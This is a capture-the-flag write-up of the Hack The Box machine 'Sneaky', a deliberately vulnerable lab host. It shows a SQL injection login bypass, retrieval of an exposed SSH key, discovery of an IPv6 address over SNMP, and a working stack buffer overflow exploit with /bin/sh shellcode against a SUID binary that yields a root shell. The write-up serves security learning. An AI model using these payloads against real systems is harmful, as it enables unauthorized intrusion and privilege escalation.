---
permalink: /posts/HTB/Sneaky
title:  "HTB Sneaky"
author: Luc Kolen
description: "Sneaky is a medium Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Medium
  - Linux
  - Gobuster
  - SQL injection
  - SNMP
  - IPv6
  - Buffer overflow
---
# 10.10.10.20 - Sneaky

- [10.10.10.20 - Sneaky](#10101020---sneaky)
  - [Open ports](#open-ports)
    - [TCP](#tcp)
    - [UDP](#udp)
  - [HTTP](#http)
  - [SSH](#ssh)
  - [Privilege escalation](#privilege-escalation)
    - [Creating the buffer overflow](#creating-the-buffer-overflow)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [IPv6 NMAP scan](#ipv6-nmap-scan)

## Open ports

### TCP

```bash
luc@kali:~/HTB/Sneaky$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.20
```

|Port|Service|Version
|---|---|---|
80/tcp|http|Apache httpd 2.4.7 ((Ubuntu))

### UDP

```bash
luc@kali:~/HTB/Sneaky$ nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all 10.10.10.20
```

|Port|Service|Version
|---|---|---|
161/udp|snmp|SNMPv1 server; net-snmp SNMPv3 server (public)

## HTTP

We get an under development page when opening `http://10.10.10.20/`.

```bash
luc@kali:~/HTB/Sneaky$ gobuster dir -u http://10.10.10.20/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
...
/dev (Status: 301)
...
```

Browsing to `http://10.10.10.20/dev/` shows a login form and the message `Member's Area Only - Login Now!`.

```http
POST /dev/login.php HTTP/1.1

name=IDoNotExist&pass=1%27+or+%271%27%3D%271
```

We don't have an username or password so using SQL injection is our only way in if we don't want to brute force both. Sending the password `1' or '1'='1` actually logs us in and we get a page with a link to download a key, `http://10.10.10.20/dev/sshkeyforadministratordifficulttimes`, we can also see `name: thrasivoulos`  which probably is a user on the site.

```bash
luc@kali:~/HTB/Sneaky$ wget http://10.10.10.20/dev/sshkeyforadministratordifficulttimes
luc@kali:~/HTB/Sneaky$ file sshkeyforadministratordifficulttimes
sshkeyforadministratordifficulttimes: PEM RSA private key
```

Interestingly there is no authentication needed for downloading the key so in theory it would've been possible to find this url with a brute force.

## SSH

We've a SSH key, but the SSH port (22) isn't open. There can be different firewall rules for IPv4 and IPv6.

```bash
luc@kali:~/HTB/Sneaky$ python /opt/Enyx/enyx.py 2c public 10.10.10.20
...
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:cba4
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:cba4
```

We can use [enyx.py](https://github.com/trickster0/Enyx) to find the IPv6 entries in the SNMP data.

```bash
luc@kali:~/HTB/Sneaky$ sudo chmod 600 sshkeyforadministratordifficulttimes
luc@kali:~/HTB/Sneaky$ ssh -i sshkeyforadministratordifficulttimes thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:cba4
load pubkey "sshkeyforadministratordifficulttimes": invalid format
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Jun 22 19:49:06 EEST 2020

  System load: 0.0               Memory usage: 5%   Processes:       179
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) groups=1000(thrasivoulos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
thrasivoulos@Sneaky:~$ cat user.txt
9fe14f76************************
```

We've successfully logged in as `thrasivoulos` via SSH.

## Privilege escalation

`thrasivoulos` is in the `sudo` group, but we don't have his password so we can't actually use it.

```bash
luc@kali:~/HTB/Sneaky$ cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
luc@kali:~/HTB/Sneaky$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
thrasivoulos@Sneaky:/tmp$ wget http://10.10.14.9:8000/linpeas.sh
thrasivoulos@Sneaky:/tmp$ chmod +x linpeas.sh
thrasivoulos@Sneaky:/tmp$ ./linpeas.sh > linpeas.result
...
[+] Useful software
...
/usr/bin/gdb
...
[+] SUID - Check easy privesc, exploits and write perms
...
/usr/local/bin/chal
...
thrasivoulos@Sneaky:/tmp$ ls -lsa /usr/local/bin/chal
8 -rwsrwsr-x 1 root root 7301 May  4  2017 /usr/local/bin/chal
```

We can run `/usr/local/bin/chal` as `root`

```bash
thrasivoulos@Sneaky:/tmp$ base64 /usr/local/bin/chal -w 0
...
copy this base64 string
...
thrasivoulos@Sneaky:/tmp$ md5sum /usr/local/bin/chal
829873da7efc928ad1fc9cc3b793a639  /usr/local/bin/chal
```

```bash
luc@kali:~/HTB/Sneaky$ echo -n '...' > chal.b64
luc@kali:~/HTB/Sneaky$ base64 -d chal.b64 > chal
luc@kali:~/HTB/Sneaky$ md5sum chal
829873da7efc928ad1fc9cc3b793a639  chal
luc@kali:~/HTB/Sneaky$ file chal
chal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped
luc@kali:~/HTB/Sneaky$ checksec --file=chal
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67) Symbols       No    0               1               chal
```

```bash
luc@kali:~/HTB/Sneaky$ /opt/Ghidra/ghidra_9.1.2_PUBLIC/ghidraRun
```

![Ghidra import](/assets/images/HTB-Sneaky/1.a%20Ghidra%20import.png)

![Ghidra main decompiled](/assets/images/HTB-Sneaky/1.b%20Ghidra%20main%20decompiled.png)

```c
undefined4 main(undefined4 param_1,int param_2)
{
  char local_16e [362];
  
  strcpy(local_16e,*(char **)(param_2 + 4));
  return 0;
}
```

We used [Ghidra](https://ghidra-sre.org/) to decompile `/usr/local/bin/chal` because we didn't know what the application does when it's run. We can see that `strcpy` is used with `param_2` as a variable which we can control and which will probably result in a buffer overflow.

### Creating the buffer overflow

We're working with a 32-bit executable and our own Kali machine is 64 bit. Luckily we can use `gdb` on the machine.

```bash
thrasivoulos@Sneaky:/tmp$ gdb /usr/local/bin/chal
...
(gdb) run $(python -c 'print "A"*400')
Starting program: /usr/local/bin/chal $(python -c 'print "A"*400')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Sending `"A"*400` results in a segmentation fault `0x41414141` so our payload is in EIP.

```bash
luc@kali:~/HTB/Sneaky$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

```bash
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
The program being debugged has been started already.

Starting program: /usr/local/bin/chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

Program received signal SIGSEGV, Segmentation fault.
0x316d4130 in ?? ()
```

```bash
luc@kali:~/HTB/Sneaky$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 400 -q 0x316d4130
[*] Exact match at offset 362
```

We've now used the generated pattern to find the exact offset, `362`. We can use [this](https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html) as the shellcode for our buffer overflow.

```bash
(gdb) run $(python -c 'print "A"*400')
Starting program: /usr/local/bin/chal $(python -c 'print "A"*400')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/100x $esp
0xbffff560:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff570:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff580:     0x08004141      0xb7fce000      0x00000000      0x00000000
0xbffff590:     0x00000000      0xe6535a5b      0xdeccfe4b      0x00000000
0xbffff5a0:     0x00000000      0x00000000      0x00000002      0x08048320
0xbffff5b0:     0x00000000      0xb7ff24c0      0xb7e3ba09      0xb7fff000
0xbffff5c0:     0x00000002      0x08048320      0x00000000      0x08048341
0xbffff5d0:     0x0804841d      0x00000002      0xbffff5f4      0x08048450
0xbffff5e0:     0x080484c0      0xb7fed160      0xbffff5ec      0x0000001c
0xbffff5f0:     0x00000002      0xbffff714      0xbffff728      0x00000000
0xbffff600:     0xbffff8b9      0xbffff8ca      0xbffff8da      0xbffff8e6
0xbffff610:     0xbffff90c      0xbffff91f      0xbffff931      0xbffffe52
0xbffff620:     0xbffffe5e      0xbffffebc      0xbffffed8      0xbffffee7
0xbffff630:     0xbffffef0      0xbfffff01      0xbfffff0a      0xbfffff22
0xbffff640:     0xbfffff2a      0xbfffff3f      0xbfffff87      0xbfffffa7
0xbffff650:     0xbfffffc6      0x00000000      0x00000020      0xb7fdccf0
0xbffff660:     0x00000021      0xb7fdc000      0x00000010      0x078bfbff
0xbffff670:     0x00000006      0x00001000      0x00000011      0x00000064
0xbffff680:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffff690:     0x00000005      0x00000009      0x00000007      0xb7fde000
0xbffff6a0:     0x00000008      0x00000000      0x00000009      0x08048320
0xbffff6b0:     0x0000000b      0x000003e8      0x0000000c      0x000003e8
0xbffff6c0:     0x0000000d      0x000003e8      0x0000000e      0x000003e8
0xbffff6d0:     0x00000017      0x00000001      0x00000019      0xbffff6fb
0xbffff6e0:     0x0000001f      0xbfffffe8      0x0000000f      0xbffff70b
(gdb) x/100x $esp-400
0xbffff3d0:     0xbffff3f2      0x00000000      0x00000000      0x08048441
0xbffff3e0:     0xbffff3f2      0xbffff728      0x0804821d      0xb7fffc24
0xbffff3f0:     0x414118fc      0x41414141      0x41414141      0x41414141
0xbffff400:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff410:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff420:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff430:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff440:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff450:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff460:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff470:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff480:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff490:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff500:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff510:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff520:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff530:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff540:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff550:     0x41414141      0x41414141      0x41414141      0x41414141
```

We can see our `0x41` is `A` and we can see those in `ESP`. We'll use `0x90` in our final exploit so we don't have to be precise and we'll use `0xbffff500` as our address for now.

```python
BUFFER_SIZE=362
SHELL_CODE = "\x31\xc0\x50\x68\x2f\x2f\x73"
SHELL_CODE += "\x68\x68\x2f\x62\x69\x6e\x89"
SHELL_CODE += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELL_CODE += "\xcd\x80\x31\xc0\x40\xcd\x80"
NOP_SLED = "\x90"*(BUFFER_SIZE-len(SHELL_CODE))
EIP = "\x00\xf5\xff\xbf" #0xbffff500
PAYLOAD = NOP_SLED + SHELL_CODE + EIP
print PAYLOAD
```

We create `exploit.py` so we can use it to pass our payload as a parameter to `/usr/local/bin/chal`.

```bash
thrasivoulos@Sneaky:/tmp$ /usr/local/bin/chal $(python exploit.py)
Segmentation fault (core dumped)
```

We don't have a successful execution yet.

```bash
thrasivoulos@Sneaky:/tmp$ gdb /usr/local/bin/chal
(gdb) run $(python exploit.py)
Starting program: /usr/local/bin/chal $(python exploit.py)

Program received signal SIGSEGV, Segmentation fault.
0x00bffff5 in ?? ()
(gdb) x/100x $esp
0xbffff570:     0x00000002      0xbffff604      0xbffff610      0xb7feccca
0xbffff580:     0x00000002      0xbffff604      0xbffff5a4      0x0804a014
0xbffff590:     0x0804821c      0xb7fce000      0x00000000      0x00000000
0xbffff5a0:     0x00000000      0x1982ff9b      0x211d7b8b      0x00000000
0xbffff5b0:     0x00000000      0x00000000      0x00000002      0x08048320
0xbffff5c0:     0x00000000      0xb7ff24c0      0xb7e3ba09      0xb7fff000
0xbffff5d0:     0x00000002      0x08048320      0x00000000      0x08048341
0xbffff5e0:     0x0804841d      0x00000002      0xbffff604      0x08048450
0xbffff5f0:     0x080484c0      0xb7fed160      0xbffff5fc      0x0000001c
0xbffff600:     0x00000002      0xbffff729      0xbffff73d      0x00000000
0xbffff610:     0xbffff8ab      0xbffff8bc      0xbffff8cc      0xbffff8d8
0xbffff620:     0xbffff8fe      0xbffff911      0xbffff923      0xbffffe44
0xbffff630:     0xbffffe50      0xbffffeae      0xbffffeca      0xbffffed9
0xbffff640:     0xbffffef0      0xbfffff01      0xbfffff0a      0xbfffff22
0xbffff650:     0xbfffff2a      0xbfffff3f      0xbfffff87      0xbfffffa7
0xbffff660:     0xbfffffc6      0x00000000      0x00000020      0xb7fdccf0
0xbffff670:     0x00000021      0xb7fdc000      0x00000010      0x078bfbff
0xbffff680:     0x00000006      0x00001000      0x00000011      0x00000064
0xbffff690:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffff6a0:     0x00000005      0x00000009      0x00000007      0xb7fde000
0xbffff6b0:     0x00000008      0x00000000      0x00000009      0x08048320
0xbffff6c0:     0x0000000b      0x000003e8      0x0000000c      0x000003e8
0xbffff6d0:     0x0000000d      0x000003e8      0x0000000e      0x000003e8
0xbffff6e0:     0x00000017      0x00000001      0x00000019      0xbffff70b
0xbffff6f0:     0x0000001f      0xbfffffe8      0x0000000f      0xbffff71b
(gdb) x/100x $esp-500
0xbffff37c:     0xb7fd9b48      0x00000001      0x00000001      0x00000000
0xbffff38c:     0xb7fe90ab      0xb7fffaf0      0xb7fd9e08      0xbffff3b4
0xbffff39c:     0x0804a00c      0x0804821c      0x080481dc      0x00000000
0xbffff3ac:     0x00000000      0xb7fff55c      0xb7e26534      0xbffff438
0xbffff3bc:     0x00000000      0xb7ff756c      0xb7fce000      0x00000000
0xbffff3cc:     0x00000000      0xbffff568      0xb7ff24c0      0xbffff594
0xbffff3dc:     0xb7ea6a30      0xbffff402      0x00000000      0x00000000
0xbffff3ec:     0x08048441      0xbffff402      0xbffff73d      0x0804821d
0xbffff3fc:     0xb7fffc24      0x909018fc      0x90909090      0x90909090
0xbffff40c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff41c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff42c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff43c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff44c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff45c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff46c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff47c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff48c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff49c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4ec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4fc:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb)
0xbffff50c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff51c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff52c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff53c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff54c:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
0xbffff55c:     0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0
0xbffff56c:     0x00bffff5      0x00000002      0xbffff604      0xbffff610
0xbffff57c:     0xb7feccca      0x00000002      0xbffff604      0xbffff5a4
0xbffff58c:     0x0804a014      0x0804821c      0xb7fce000      0x00000000
0xbffff59c:     0x00000000      0x00000000      0x1982ff9b      0x211d7b8b
0xbffff5ac:     0x00000000      0x00000000      0x00000000      0x00000002
0xbffff5bc:     0x08048320      0x00000000      0xb7ff24c0      0xb7e3ba09
0xbffff5cc:     0xb7fff000      0x00000002      0x08048320      0x00000000
0xbffff5dc:     0x08048341      0x0804841d      0x00000002      0xbffff604
0xbffff5ec:     0x08048450      0x080484c0      0xb7fed160      0xbffff5fc
0xbffff5fc:     0x0000001c      0x00000002      0xbffff729      0xbffff73d
0xbffff60c:     0x00000000      0xbffff8ab      0xbffff8bc      0xbffff8cc
0xbffff61c:     0xbffff8d8      0xbffff8fe      0xbffff911      0xbffff923
0xbffff62c:     0xbffffe44      0xbffffe50      0xbffffeae      0xbffffeca
0xbffff63c:     0xbffffed9      0xbffffef0      0xbfffff01      0xbfffff0a
0xbffff64c:     0xbfffff22      0xbfffff2a      0xbfffff3f      0xbfffff87
0xbffff65c:     0xbfffffa7      0xbfffffc6      0x00000000      0x00000020
0xbffff66c:     0xb7fdccf0      0x00000021      0xb7fdc000      0x00000010
0xbffff67c:     0x078bfbff      0x00000006      0x00001000      0x00000011
0xbffff68c:     0x00000064      0x00000003      0x08048034      0x00000004
(gdb)
0xbffff69c:     0x00000020      0x00000005      0x00000009      0x00000007
0xbffff6ac:     0xb7fde000      0x00000008      0x00000000      0x00000009
0xbffff6bc:     0x08048320      0x0000000b      0x000003e8      0x0000000c
0xbffff6cc:     0x000003e8      0x0000000d      0x000003e8      0x0000000e
0xbffff6dc:     0x000003e8      0x00000017      0x00000001      0x00000019
0xbffff6ec:     0xbffff70b      0x0000001f      0xbfffffe8      0x0000000f
0xbffff6fc:     0xbffff71b      0x00000000      0x00000000      0xfb000000
0xbffff70c:     0x0f031f2b      0xfb727334      0x5d0fc92e      0x69d0197d
0xbffff71c:     0x00363836      0x00000000      0x00000000      0x73752f00
0xbffff72c:     0x6f6c2f72      0x2f6c6163      0x2f6e6962      0x6c616863
0xbffff73c:     0x90909000      0x90909090      0x90909090      0x90909090
0xbffff74c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff75c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff76c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff77c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff78c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff79c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff80c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff81c:     0x90909090      0x90909090      0x90909090      0x90909090
```

We can see the `0x90` stop and start again in the `ESP` register. We'll try address `0xbffff75c` now.

```bash
thrasivoulos@Sneaky:/tmp$ nano exploit.py
BUFFER_SIZE=362
SHELL_CODE = "\x31\xc0\x50\x68\x2f\x2f\x73"
SHELL_CODE += "\x68\x68\x2f\x62\x69\x6e\x89"
SHELL_CODE += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELL_CODE += "\xcd\x80\x31\xc0\x40\xcd\x80"
NOP_SLED = "\x90"*(BUFFER_SIZE-len(SHELL_CODE))
#EIP = "\x00\xf5\xff\xbf" #0xbffff500
EIP = "\x5c\xf7\xff\xbf" #0xbffff75c
PAYLOAD = NOP_SLED + SHELL_CODE + EIP
print PAYLOAD
thrasivoulos@Sneaky:/tmp$ /usr/local/bin/chal $(python exploit.py)
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
# cat /root/root.txt
c5153d86************************
```

## TL;DR

- Find `/dev` on the webserver
- SQL injection to login
- Download SSH key
- Use SNMP to find IPv6 address which has SSH port open
- Buffer overflow SUID application to get root shell

## Bonus

### IPv6 NMAP scan

```bash
luc@kali:~/HTB/Sneaky$ nmap -sV dead:beef:0000:0000:0250:56ff:feb9:cba4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 14:52 CEST
dead:beef::250:56ff:feb9:5e2d looks like an IPv6 target specification -- you have to use the -6 option.
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.18 seconds
luc@kali:~/HTB/Sneaky$ nmap -6 -sV dead:beef:0000:0000:0250:56ff:feb9:cba4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 14:51 CEST
Nmap scan report for dead:beef:0000:0000:0250:56ff:feb9:cba4
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```

With the `-6` parameter we can use `NMAP` in IPv6 mode. We can see that port 22 which we used for SSH is open, but 80 is also open here. Browsing to `http://[dead:beef:0000:0000:0250:56ff:feb9:cba4]/` gives us the same webpage we got via IPv4 earlier.
